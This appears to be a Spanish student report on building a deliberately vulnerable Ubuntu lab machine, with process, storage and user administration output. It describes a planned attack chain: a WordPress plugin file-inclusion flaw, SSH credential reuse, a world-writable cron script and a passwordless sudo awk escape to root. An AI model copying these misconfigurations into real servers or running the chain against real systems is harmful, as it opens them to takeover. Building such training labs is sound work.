# Desarrollo

## 1. Descripción general del sistema (Máquina: Ammonia)

#### Tipo de sistema: Servidor interno basado en el sistema operativo Ubuntu Server (Version 22.04)
#### Finalidad: Alojar la aplicación web corporativa / blog de divulgación científica.
#### Servicios principales instalados:
- Servidor web lighttpd ((MD-2)) en el puerto 7664 corriendo una instancia de WordPress ((WB-1)).
- Servidor de acceso remoto OpenSSH ((MD-1)) en el puerto estándar 22.

#### Usuarios relevantes:
- haber_fritz: Cuenta local con bajos privilegios encargada de la gestión del entorno inicial.
- clara_immerwahr: Cuenta local intermedia responsable de las tareas de automatización y almacenamiento de documentos científicos.
- root: Superusuario y administrador absoluto del sistema.

#### Vulnerabilidades creadas (Cadena de explotación):

- Inclusión de Archivos Locales (LFI): Presencia del plugin vulnerable Mail Masta en la aplicación web, lo que permite la lectura de archivos sensibles como wp-config.php y la fuga de credenciales de la base de datos.

- Reutilización de Credenciales: La clave hallada en la configuración web es válida para el acceso SSH del usuario haber_fritz.

- Permisos de Escritura Globales (777) en Tarea Cron: El script /opt/scripts/backup_notes.sh ((SC-1)) es ejecutado automáticamente por el usuario clara_immerwahr en intervalos de un minuto, pero permite su modificación por cualquier usuario del sistema.

- Configuración Laxa de Sudoers: El usuario clara_immerwahr dispone de permisos de ejecución para el binario /usr/bin/awk bajo privilegios de root sin requerir contraseña (NOPASSWD).

#### Objetivo de la auditoría: 
El auditor deberá identificar la vulnerabilidad LFI para extraer las credenciales, consolidar acceso inicial por SSH como haber_fritz, secuestrar la tarea programada modificando el script de mantenimiento para pivotar al usuario clara_immerwahr y, finalmente, abusar de la directiva de sudo mediante la técnica de escape del binario awk (GTFOBins) para comprometer totalmente el sistema obteniendo una shell como root.

---
---

## 2. Esquema de activos y recorrido de explotación

### 2.1. Esquema de activos
```bash
                                               ┌────────┐
                                               │  WEB   │
                                       ((WB-1))│  Blog  │ (WordPress)
                                               └───┬────┘ 
                                                   │ 
                                               ┌───▼────┐
                                               │lighttpd│ ((MD-2)) 
                                ┌─────────┐    └───┬────┘ 
                        ((MD-1))│ OpenSSH │        │ pt. 7664
                                └────┬────┘        │
                                     │ pt. 22      │ 
                                ┌────▼────┐    ┌───▼─────┐               
                      ((COM-1)) │   SSH   │    │  HTTP   │ ((COM-2))          
                                └─────────┘    └─────────┘      
                                     │              │      
                                     └──────┬───────┘
                                            │
                                    ┌───────▼───────┐
                     ((AC-1)) ──────│ Ubuntu Server │ ((SO-1)) 
                                    └───────────────┘
```
| **Identificador** | **Activo** | **Tipo** | **Función** | **Riesgo o Vulnerabilidad** |
|-------------------|------------|----------|-------------|------------------------------|
| **(WB-1)** | Blog (WordPress) | Aplicación / Web | Publicar el contenido web y actuar como interfaz principal del reto. | Información sensible expuesta (Inclusión de archivos locales o LFI mediante plugins vulnerables que comprometen el código). |
| **(MD-2)** | lighttpd | Middleware | Procesar las peticiones HTTP destinadas al blog en el puerto 7664. | Exposición de cabeceras o logs que agraven la fuga de datos si el servicio lee configuraciones de forma insegura. |
| **(MD-1)** | OpenSSH | Middleware | Gestionar las conexiones de consola remota segura en el puerto 22. | Abuso de canales de administración mediante credenciales obtenidas de forma ilícita (reutilización de claves). |
| **(COM-1)** | SSH | Comunicación | Canal de transporte para sesiones interactivas y comandos remotos. | Establecimiento de conexiones no autorizadas (shells reversas o directas) si el tráfico saliente/entrante no está filtrado. |
| **(COM-2)** | HTTP | Comunicación | Canal de transporte de hipertexto para la navegación web del usuario. | Intercepción o manipulación de peticiones si el canal viaja sin cifrar y se realizan ataques en la red local. |
| **(SO-1)** | Ubuntu Server | Servidor / S.O. | Alojar el núcleo del sistema, gestionar procesos y orquestar el hardware virtual. | Escalada de privilegios a nivel de kernel o explotación de malas configuraciones en la directiva global de sudoers. |
| **(AC-1)** | Usuarios y Archivos | Control de Acceso / Datos | Regular las identidades locales (haber_fritz, clara) y proteger los scripts/backups de mantenimiento. | Permisos laxos e incorrectos en el sistema de archivos (777 en scripts de Cron), permitiendo la inyección de código a usuarios no autorizados. |

### 2.2. Recorrido de explotación

```bash
[ Atacante (Kali) ]
       │
       ▼ (LFI en WordPress)
[ user: haber_fritz ]  <-- (Sabe de química y procesos industriales)
       │
       ▼ (Movimiento Lateral: Tarea Cron / Script inseguro)
[ user: clara_immerwahr ] <-- (Su esposa, química brillante y pacifista opositora)
       │
       ▼ (Escalada de Privilegios: GTFOBins vía sudo o SUID)
[ ROOT ]
```
---
---

## 3. Administración de procesos y rendimiento

### 3.1. Identificación de procesos y servicios

```bash
haber_fritz@ammonia:~$ ps -eo pid,ppid,user,stat,%cpu,%mem,cmd | grep -E "lighttpd|ssh|cron|awk|bash|PID" | grep -v "grep"
    PID    PPID USER     STAT %CPU %MEM CMD
    861       1 root     Ss    0.0  0.1 /usr/sbin/cron -f -P
    917       1 root     Ss    0.0  0.4 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
    996       1 www-data Ss    0.0  0.1 /usr/sbin/lighttpd -D -f /etc/lighttpd/lighttpd.conf
   1472    1321 haber_f+ S+    0.0  0.2 -bash
  13066     917 root     Ss    0.0  0.5 sshd: haber_fritz [priv]
  13113   13066 haber_f+ S     0.0  0.4 sshd: haber_fritz@pts/0
  13114   13113 haber_f+ Ss    0.0  0.2 -bash
haber_fritz@ammonia:~$ pstree -p | grep -E "lighttpd|sshd|cron|bash"
           |-cron(861)
           |-lighttpd(996)---php-cgi(1026)-+-php-cgi(1044)
           |-login(1321)---bash(1472)
           |-sshd(917)---sshd(13066)---sshd(13113)---bash(13114)-+-grep(13149)
haber_fritz@ammonia:~$ systemctl list-units --type=service --state=running | grep -E "lighttpd|ssh|cron"
  cron.service                loaded active running Regular background program processing daemon
  lighttpd.service            loaded active running Lighttpd Daemon
  ssh.service                 loaded active running OpenBSD Secure Shell server
haber_fritz@ammonia:~$ uptime && free -h && vmstat 1 3
 17:29:11 up 8 min,  2 users,  load average: 0.01, 0.09, 0.05
               total        used        free      shared  buff/cache   available
Mem:           1.9Gi       385Mi       712Mi       3.0Mi       829Mi       1.3Gi
Swap:          2.0Gi       0.0Ki       2.0Gi
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 0  0    524 729212  35324 814372    0    0   916  1121  164  310  2  2 95  0  0
 0  0    524 729212  35332 814372    0    0     0    64  115  160  0  0 100  0  0
 0  0    524 729212  35332 814372    0    0     0     0   93  150  0  0 100  0  0
```

| PID | PPID | Usuario | Servicio / Comando | Estado | Rol en el Escenario |
|-----|------|---------|-------------------|--------|---------------------|
| 9961 | 1 | www-data | `/usr/sbin/lighttpd` | Ss (Activo) | **Necesario**. Aloja el blog ((WB-1)) e hilos php-cgi (1026). Vector de acceso inicial (LFI). |
| 9171 | 1 | root | `/usr/sbin/sshd -D` | Ss (Activo) | **Necesario**. Listener maestro de SSH ((MD-1)). Gestiona la intrusión perimetral. |
| 8611 | 1 | root | `/usr/sbin/cron -f -P` | Ss (Activo) | **Necesario**. Demonio de tareas programadas. Orquesta el movimiento lateral. |
| 13114 | 13113 | haber_fritz | `-bash` | Ss (Activo) | **Proceso de sesión interactiva actual** vinculada a la consola pts/0. |

- Relación Padre-Hijo: El demonio sshd maestro (PID 917) bifurca un proceso privilegiado controlado por root (PID 13066) al recibir la conexión, el cual genera la sesión secundaria del usuario (PID 13113) para finalmente invocar el intérprete /bin/bash (PID 13114) del auditor. De igual manera, lighttpd (PID 996) actúa como proceso padre de la infraestructura de procesamiento dinámico php-cgi (PID 1026).

- Servicios prescindibles: En un entorno endurecido (hardening), servicios no críticos de red o interfaces gráficas podrían desactivarse; sin embargo, en este despliegue, la tríada lighttpd.service, ssh.service y cron.service es estrictamente mandatoria para preservar la cadena de explotación.

- Consumo de Recursos: El sistema presenta un uso de memoria volátil optimizado, consumiendo únicamente 385 MiB de los 1.9 GiB totales disponibles, manteniendo más de 1.3 GiB en estado disponible y una tasa de uso de Swap nula (0.0 KiB).

- Carga de CPU: De acuerdo con las métricas de vmstat, el procesador opera con un porcentaje de tiempo inactivo (idle) de entre el 95% y 100%, registrando un promedio de carga (load average) mínimo de 0.01 a un minuto del arranque (uptime).

- Cumplimiento del Plan: El rendimiento cumple con los requisitos del proyecto. Los bajos tiempos de respuesta del procesador y la holgura de la memoria RAM garantizan que la ejecución periódica del cron por parte de Clara y los procesos interactivos de la reverse shell se ejecuten de forma fluida y sin demoras (delays), impidiendo la caída de servicios durante la intrusión.

### 3.2. Intervención sobre un servicio

```bash
haber_fritz@ammonia:~$ sudo systemctl status cron
[sudo] password for haber_fritz:
● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2026-07-18 17:20:56 UTC; 16min ago
       Docs: man:cron(8)
   Main PID: 861 (cron)
      Tasks: 1 (limit: 2172)
     Memory: 3.1M
        CPU: 220ms
     CGroup: /system.slice/cron.service
             └─861 /usr/sbin/cron -f -P

Jul 18 17:33:01 ammonia CRON[13175]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:34:01 ammonia CRON[13181]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:34:01 ammonia CRON[13182]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:34:01 ammonia CRON[13181]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:35:01 ammonia CRON[13187]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:35:01 ammonia CRON[13188]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:35:01 ammonia CRON[13187]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:36:01 ammonia CRON[13218]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session closed for user clara_immerwahr
lines 1-21/21 (END)

haber_fritz@ammonia:~$ sudo systemctl stop cron
haber_fritz@ammonia:~$ sudo systemctl status cron
○ cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: inactive (dead) since Sat 2026-07-18 17:37:12 UTC; 4s ago
       Docs: man:cron(8)
    Process: 861 ExecStart=/usr/sbin/cron -f -P $EXTRA_OPTS (code=killed, signal=TERM)
   Main PID: 861 (code=killed, signal=TERM)
        CPU: 234ms

Jul 18 17:35:01 ammonia CRON[13187]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:36:01 ammonia CRON[13218]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:36:01 ammonia CRON[13217]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:37:01 ammonia CRON[13240]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (ui>
Jul 18 17:37:01 ammonia CRON[13241]: (clara_immerwahr) CMD (/opt/scripts/backup_notes.sh)
Jul 18 17:37:01 ammonia CRON[13240]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 17:37:12 ammonia systemd[1]: Stopping Regular background program processing daemon...
Jul 18 17:37:12 ammonia systemd[1]: cron.service: Deactivated successfully.
Jul 18 17:37:12 ammonia systemd[1]: Stopped Regular background program processing daemon.
lines 1-18/18 (END)

haber_fritz@ammonia:~$ sudo systemctl start cron
haber_fritz@ammonia:~$ sudo systemctl status cron
● cron.service - Regular background program processing daemon
     Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
     Active: active (running) since Sat 2026-07-18 17:37:22 UTC; 6s ago
       Docs: man:cron(8)
   Main PID: 13258 (cron)
      Tasks: 1 (limit: 2172)
     Memory: 340.0K
        CPU: 2ms
     CGroup: /system.slice/cron.service
             └─13258 /usr/sbin/cron -f -P

Jul 18 17:37:22 ammonia systemd[1]: Started Regular background program processing daemon.
Jul 18 17:37:22 ammonia cron[13258]: (CRON) INFO (pidfile fd = 3)
Jul 18 17:37:22 ammonia cron[13258]: (CRON) INFO (Skipping @reboot jobs -- not system startup)
```
### 3.3. Modificación de la prioridad de un proceso

```bash
haber_fritz@ammonia:~$ bash -c "exec -a ammonia-sensor-mock sleep 300" &
[5] 13376
haber_fritz@ammonia:~$ ps -o pid,ppid,user,stat,ni,cmd -p 13376
    PID    PPID USER     STAT  NI CMD
  13376   13114 haber_f+ S      0 ammonia-sensor-mock 300
haber_fritz@ammonia:~$ renice 10 -p 13376
13376 (process ID) old priority 0, new priority 10
haber_fritz@ammonia:~$ ps -o pid,ppid,user,stat,ni,cmd -p 13376
    PID    PPID USER     STAT  NI CMD
  13376   13114 haber_f+ SN    10 ammonia-sensor-mock 300
haber_fritz@ammonia:~$ kill 13376
```

- Proceso utilizado: Se instanció un proceso en segundo plano camuflado en memoria bajo el nombre descriptivo de ammonia-sensor-mock (PID 13376), simulando un capturador de telemetría o sensor químico del laboratorio.

- Prioridad inicial y asignada: El proceso nació con una prioridad estándar o factor Nice inicial de 0 (estado S, suspendido de forma ejecutable). Mediante la llamada de administración renice 10 -p 13376, se modificó su comportamiento asignándole un Nice final de 10. En el segundo control de estado, la columna STAT mutó a SN, donde la bandera N (low-priority nice) confirma que el planificador ha degradado con éxito la prioridad del hilo.

- Efecto del valor Nice: El factor Nice define la tolerancia de un proceso frente al resto en una escala de -20 (máxima prioridad, requiere privilegios de root) a 19 (mínima prioridad). Al elevar el valor a 10, se le indica al sistema operativo que le otorgue menos ráfagas de tiempo de CPU (time-slices) si el servidor entra en alta carga, evitando que un script de monitorización comprometa el rendimiento de servicios críticos del reto como lighttpd o sshd.

- Finalización del proceso: Una vez validadas las directivas de control, el proceso se concluyó de forma limpia enviando la señal estándar SIGTERM (15) mediante el comando kill 13376, liberando inmediatamente el identificador de la tabla del sistema operativo.

### 3.4. Comprobación final

| Parámetro | Comando o evidencia | Resultado | Cumple | Acción correctiva |
|-----------|---------------------|-----------|--------|-------------------|
| Uso de CPU | `top` | 0.0% us / 100.0% id (Carga nula en el procesador, Load Avg: 0.00). | Sí | Ninguna. La CPU cuenta con disponibilidad absoluta para responder a los scripts de explotación. |
| Uso de memoria | `free -h` | 19.6% en uso (379 MiB utilizados de un total de 1.9 GiB disponibles). | Sí | Ninguna. Existen 1.3 GiB de memoria disponible garantizada. |
| Servicio seleccionado | `systemctl status` | State: running (0 trabajos en cola, 0 unidades caídas). Estructura limpia en system.slice. | Sí | Ninguna. El estado global del sistema operativo es completamente saludable. |
| Prioridad modificada | `renice` / `ps` | Valor actualizado. Degradación de prioridad exitosa a factor Nice 10 (STAT: SN). | Sí | Ninguna. |

---
---

## 4. Administración del almacenamiento

### 4.1. Identificación del almacenamiento
```bash
haber_fritz@ammonia:~$ lsblk -f
NAME FSTYPE FSVER LABEL                         UUID                                   FSAVAIL FSUSE% MOUNTPOINTS
loop0
     squash 4.0                                                                              0   100% /snap/snapd/27406
loop1
     squash 4.0                                                                              0   100% /snap/lxd/40115
loop2
     squash 4.0                                                                              0   100% /snap/core22/2411
loop3
     squash 4.0                                                                              0   100% /snap/snapd/21759
loop4
     squash 4.0                                                                              0   100% /snap/lxd/29351
loop5
     squash 4.0                                                                              0   100% /snap/core20/2318
loop6
     squash 4.0                                                                              0   100% /snap/core20/2866
sda
├─sda1
│
├─sda2
│    ext4   1.0                                 ae1af663-a17d-4b91-a388-7b304626f12b      1.7G     7% /boot
└─sda3
     LVM2_m LVM2                                EGLS8q-syYn-zTwu-ec1h-LCE9-1HiJ-lwlwCU
  └─ubuntu--vg-ubuntu--lv
     ext4   1.0                                 1d2170cc-1b71-4933-b0ac-6948c3798110      4.5G    54% /
sr0  iso966 Jolie Ubuntu-Server 22.04.5 LTS amd64
                                                2024-09-11-18-46-48-00
haber_fritz@ammonia:~$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
tmpfs                              193M  1.3M  192M   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv   12G  6.1G  4.6G  58% /
tmpfs                              964M     0  964M   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
/dev/sda2                          2.0G  133M  1.7G   8% /boot
tmpfs                              193M  4.0K  193M   1% /run/user/1000
```

- Dispositivo y Partición: El sistema operativo está instalado en el disco físico sda, utilizando un esquema de volúmenes lógicos (LVM) mapeado en la partición raíz /dev/mapper/ubuntu--vg-ubuntu--lv (derivada de la partición física sda3). El directorio de arranque se aloja de forma aislada en /dev/sda2 (/boot).

- Sistema de Archivos: Tanto el volumen raíz (/) como la partición de arranque (/boot) están estructurados bajo el formato nativo ext4.

- Espacio Ocupado: El volumen principal del sistema operativo tiene 6.1 GiB ocupados (un 58% del total asignado).

- Espacio Disponible: Quedan exactamente 4.6 GiB totalmente libres y accesibles en la raíz del sistema operativo.

- Cumplimiento: Sí, cumple rigurosamente con el plan de explotación. Contar con un 42% de almacenamiento libre asegura holgura absoluta para la generación de logs de auditoría, la descarga de herramientas tácticas y la inyección temporal de archivos durante las fases de compromiso web y escalada de privilegios sin riesgo de saturar el disco.

### 4.2. Organización de la información

```bash
/
├── etc/
│   └── lighttpd/          # Configuración del servidor web perimetral
├── var/
│   └── www/
│       └── html/          # Aplicación web activa (WordPress)
└── opt/
    └── scripts/           # Automatizaciones y scripts del reto (Cron)
```
- /etc/lighttpd/ (Directorio de Configuración): Almacena las directivas operacionales del servidor web lighttpd.conf. Controla los parámetros del puerto no estándar (7664) y el módulo CGI que procesa las peticiones dinámicas. Es una zona de auditoría estática.

- /var/www/html/ (Capa de Aplicación Web): Espacio bajo la propiedad del usuario www-data. Aloja los ficheros fuentes del CMS WordPress ((WB-1)), la base de datos local y, críticamente, los plugins vulnerables que permiten la Inclusión de Archivos Locales (LFI) y la exfiltración inicial del wp-config.php.

- /opt/scripts/ (Capa de Automatización y Movimiento Lateral): Reservado para software opcional y scripts de terceros. Contiene el binario de mantenimiento /opt/scripts/backup_notes.sh. Al poseer una asignación laxa de privilegios (777), se convierte en el objetivo del vector de secuestro de tareas (hijacking) por parte del auditor bajo el contexto de la tarea automatizada de Clara.

### 4.3. Copia de seguridad

```bash
haber_fritz@ammonia:~$ sudo tar -czf /opt/scripts/backup-web-ammonia.tar.gz /var/www/html
[sudo] password for haber_fritz:
tar: Removing leading `/' from member names
haber_fritz@ammonia:~$ ls -lh /opt/scripts/backup-web-ammonia.tar.gz
-rw-r--r-- 1 root root 36M Jul 18 17:59 /opt/scripts/backup-web-ammonia.tar.gz
```
- Información copiada: Se ha empaquetado y comprimido la totalidad del directorio /var/www/html, el cual aloja el código fuente del CMS WordPress ((WB-1)), configuraciones internas, bases de datos planas y plugins del escenario.

- Importancia estratégica: Esta zona concentra la superficie de ataque inicial (vector LFI). Disponer de un respaldo es crítico porque las herramientas de automatización o los payloads de explotación mal optimizados pueden corromper el índice de la aplicación web o alterar archivos esenciales, inhabilitando el laboratorio para futuros despliegues o alumnos.

- Almacenamiento del respaldo: El archivo se ha consolidado bajo el nombre backup-web-ammonia.tar.gz dentro del directorio administrativo /opt/scripts/, registrando un peso optimizado de 36 MiB gracias al algoritmo de compresión gzip.

- Procedimiento de recuperación: En caso de fallo crítico o intrusión destructiva, los servicios lógicos se restablecerían en pocos segundos mediante el purgado del directorio comprometido y la descompresión del archivo raíz con el comando: `sudo tar -xzf /opt/scripts/backup-web-ammonia.tar.gz -C /`

### 4.4. Verificación de la integridad

```bash
root@ammonia:/home/haber_fritz# sha256sum /opt/scripts/backup-web-ammonia.tar.gz > /opt/scripts/backup-web-ammonia.tar.gz.sha256
root@ammonia:/home/haber_fritz# sha256sum -c /opt/scripts/backup-web-ammonia.tar.gz.sha256
/opt/scripts/backup-web-ammonia.tar.gz: OK
```

- ¿Qué representa el hash? Es una firma digital única de longitud fija (256 bits) calculada mediante el algoritmo matemático SHA-256. Funciona como una huella dactilar exacta del archivo empaquetado.

- Detección de modificaciones: Debido al efecto avalancha, si un atacante alterase un solo bit o carácter dentro del archivo backup-web-ammonia.tar.gz, el hash resultante cambiaría por completo, rompiendo la correspondencia con el archivo de verificación original.

- Validación de consistencia: El output OK arrojado por el comando sha256sum -c certifica de manera unívoca que el archivo comprimido actual es idéntico byte por byte al original mapeado en el momento del respaldo, garantizando que está libre de corrupción o inyecciones de código.

### 4.5. Registros del sistema

```bash
root@ammonia:/home/haber_fritz# tail -n 15 /var/log/auth.log > /opt/scripts/ssh_access.log
root@ammonia:/home/haber_fritz# cat /opt/scripts/ssh_access.log
Jul 18 17:59:27 ammonia sudo: pam_unix(sudo:session): session closed for user root
Jul 18 18:00:01 ammonia CRON[13527]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (uid=0)
Jul 18 18:00:01 ammonia CRON[13527]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 18:01:01 ammonia CRON[13534]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (uid=0)
Jul 18 18:01:01 ammonia CRON[13534]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 18:02:01 ammonia CRON[13540]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (uid=0)
Jul 18 18:02:01 ammonia CRON[13540]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 18:02:44 ammonia sudo: haber_fritz : TTY=pts/0 ; PWD=/home/haber_fritz ; USER=root ; COMMAND=/usr/bin/su
Jul 18 18:02:44 ammonia sudo: pam_unix(sudo:session): session opened for user root(uid=0) by haber_fritz(uid=1000)
Jul 18 18:02:44 ammonia su: (to root) root on pts/1
Jul 18 18:02:44 ammonia su: pam_unix(su:session): session opened for user root(uid=0) by haber_fritz(uid=0)
Jul 18 18:03:01 ammonia CRON[13560]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (uid=0)
Jul 18 18:03:01 ammonia CRON[13560]: pam_unix(cron:session): session closed for user clara_immerwahr
Jul 18 18:04:01 ammonia CRON[13566]: pam_unix(cron:session): session opened for user clara_immerwahr(uid=1001) by (uid=0)
Jul 18 18:04:01 ammonia CRON[13566]: pam_unix(cron:session): session closed for user clara_immerwahr
root@ammonia:/home/haber_fritz# journalctl -u lighttpd -n 15 > /opt/scripts/lighttpd_access.log
root@ammonia:/home/haber_fritz# cat /opt/scripts/lighttpd_access.log
Jul 14 13:30:11 ammonia systemd[1]: Started Lighttpd Daemon.
Jul 14 13:30:11 ammonia lighttpd[988]: 2026-07-14 13:30:11: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 15 07:37:08 ammonia lighttpd[988]: 2026-07-15 07:37:08: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
-- Boot 156cd879d38e4740a198f9b75cf0fbc3 --
Jul 15 08:06:55 ammonia systemd[1]: Starting Lighttpd Daemon...
Jul 15 08:06:56 ammonia lighttpd[856]: 2026-07-15 08:06:55: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 15 08:06:56 ammonia systemd[1]: Started Lighttpd Daemon.
Jul 15 08:06:56 ammonia lighttpd[963]: 2026-07-15 08:06:56: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 15 09:44:57 ammonia lighttpd[963]: 2026-07-15 09:44:57: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 16 07:29:24 ammonia lighttpd[963]: 2026-07-16 07:29:23: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 16 09:47:52 ammonia lighttpd[963]: 2026-07-16 09:47:52: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 17 07:07:35 ammonia lighttpd[963]: 2026-07-17 07:07:34: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
-- Boot ef8e8e8f0c5e4d58a388b79359811194 --
Jul 18 17:20:56 ammonia systemd[1]: Starting Lighttpd Daemon...
Jul 18 17:20:57 ammonia lighttpd[870]: 2026-07-18 17:20:56: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
Jul 18 17:20:57 ammonia systemd[1]: Started Lighttpd Daemon.
Jul 18 17:20:57 ammonia lighttpd[996]: 2026-07-18 17:20:57: (configfile.c.426) Warning: mod_auth should be listed in server.modules before dynamic backends such as mod_fastcgi
root@ammonia:/home/haber_fritz#
```
Servicio 1 — Subsistema de Autenticación (auth.log): Generado por el demonio de seguridad y PAM (Pluggable Authentication Modules). Contiene registros detallados sobre elevaciones de privilegios (sudo), accesos por SSH e inicios de sesiones automatizadas.

Detección: Permite identificar intentos de fuerza bruta, ejecuciones no autorizadas de sudo por el usuario haber_fritz o, como se evidencia en la captura, el ciclo exacto minuto a minuto de las sesiones del usuario clara_immerwahr instanciadas por el sistema (CRON).

Servicio 2 — Servidor Web HTTP (lighttpd): Controlado por el gestor de servicios systemd y recolectado vía journalctl. Registra eventos del ciclo de vida del servicio web, inicialización de módulos (mod_fastcgi) y advertencias de configuración perimetral.

Detección: Permite aislar caídas provocadas por la inyección de payloads, escaneos de directorios automatizados con herramientas de intrusión o reinicios anómalos del demonio HTTP perimetral.

Protección anti-modificaciones: Los logs almacenados en /opt/scripts/ deben protegerse de forma estricta (restringiendo la escritura mediante permisos rígidos a root) debido a que son la primera línea de defensa forense. Si un atacante logra comprometer la máquina, intentará manipular estos registros para borrar sus huellas (log wiping), ocultar su dirección IP de origen y evadir las alertas del equipo de defensa (Blue Team).

### 4.6. Comprobación final

| Parámetro | Comando o evidencia | Resultado | Cumple | Acción correctiva |
|-----------|---------------------|-----------|--------|-------------------|
| Sistema de archivos | `lsblk -f` | ext4 detectado nativamente en el volumen raíz / y en /boot. | Sí | Ninguna. Formato óptimo para la retención de metadatos. |
| Uso del almacenamiento | `df -h` | 58% ocupado en la partición principal (4.6 GiB totalmente libres). | Sí | Ninguna. Espacio suficiente para albergar logs y payloads. |
| Estructura creada | `ls -ld /opt/scripts /var/www/html` | Correcta. Estructura FHS de producción operativa y verificada. | Sí | Ninguna. Rutas reales listas para la simulación del reto. |
| Copia de seguridad | Archivo .tar.gz | Creado en /opt/scripts/backup-web-ammonia.tar.gz (36M). | Sí | Ninguna. Respaldado con éxito el entorno web de WordPress. |
| Integridad | `sha256sum -c` | /opt/scripts/backup-web-ammonia.tar.gz: OK | Sí | Ninguna. Se garantiza la inmutabilidad de la copia. |
| Registros | Logs seleccionados | Localizados y volcados (ssh_access.log y lighttpd_access.log). | Sí | Ninguna. |

---
---

## 5. Administración de usuarios, permisos y accesos

### 5.1. Identificación de usuarios y grupos

```bash
root@ammonia:/home/haber_fritz# id haber_fritz
uid=1000(haber_fritz) gid=1000(haber_fritz) groups=1000(haber_fritz),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
root@ammonia:/home/haber_fritz# id clara_immerwahr
uid=1001(clara_immerwahr) gid=1001(clara_immerwahr) groups=1001(clara_immerwahr)
root@ammonia:/home/haber_fritz# grep -E '/bin/bash|/bin/sh' /etc/passwd
root:x:0:0:root:/root:/bin/bash
haber_fritz:x:1000:1000:Fritz Haber:/home/haber_fritz:/bin/bash
clara_immerwahr:x:1001:1001:Clara Immerwahr,,,:/home/clara_immerwahr:/bin/bash
root@ammonia:/home/haber_fritz# id www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@ammonia:/home/haber_fritz#
```
| Usuario | Tipo de cuenta | Grupo primario | Función en el escenario | Acceso permitido / Shell |
|---------|---------------|----------------|-------------------------|--------------------------|
| root | Superusuario | root (0) | Administrador supremo del sistema operativo. Objetivo final del reto. | Sí (`/bin/bash`). Bloqueado en SSH perimetral. |
| haber_fritz | Usuario | haber_fritz (1000) | Auditor/Punto de persistencia local. Almacena flags e información intermedia. | Sí (`/bin/bash`). Sin privilegios de sudo. |
| clara_immerwahr | Usuario | clara_immerwahr (1001) | Administradora interna con permisos específicos de explotación (awk). | Sí (`/bin/bash`). Origen del script de respaldo. |
| www-data | Servicio | www-data (33) | Ejecución del servidor web perimetral (lighttpd) y WordPress. | No (`/usr/sbin/nologin`). Directorio `/var/www/html`. |

### 5.2. Creación de usuarios y grupos

```bash
       [ Nivel Supremo ]            (Acceso Total)
              |                          ROOT
              v                           ^
       [ Nivel Intermedio ]               |  <-- Escalada vía Sudo (awk)
       (Usuario Autorizado)         CLARA_IMMERWAHR
              ^                           ^
              |                           |  <-- Movimiento lateral (Cron)
       [ Nivel Inicial ]                  |
     (Usuarios del Reto)            [HABER_FRITZ] (Usuario No Autorizado)
                                          |
                                          v
                                 (Aislado / Sin Sudo)
```
                             
### 5.3. Configuración de propietarios y permisos

```bash
root@ammonia:/home/haber_fritz# ls -ld /var/www/html /opt/scripts
drwxr-xr-x 2 root     root     4096 Jul 18 18:05 /opt/scripts
drwxr-xr-x 5 www-data www-data 4096 Jul 15 10:58 /var/www/html
```

- Qué usuario es el propietario. El usuario propietario del directorio /opt/scripts/ y de los recursos de automatización internos es root (el superusuario del sistema).
- Qué grupo tiene acceso. El grupo propietario asignado al recurso es el grupo root. No obstante, al tratarse de un entorno de escalada, el acceso está condicionado globalmente por los permisos del tercer bloque (others).
- Qué permisos tiene el propietario. El propietario (root) dispone de permisos totales de Lectura, Escritura y Ejecución (rwx / Valor octal 7), lo que le permite modificar la ruta, añadir nuevos scripts o alterar las tareas automatizadas del sistema
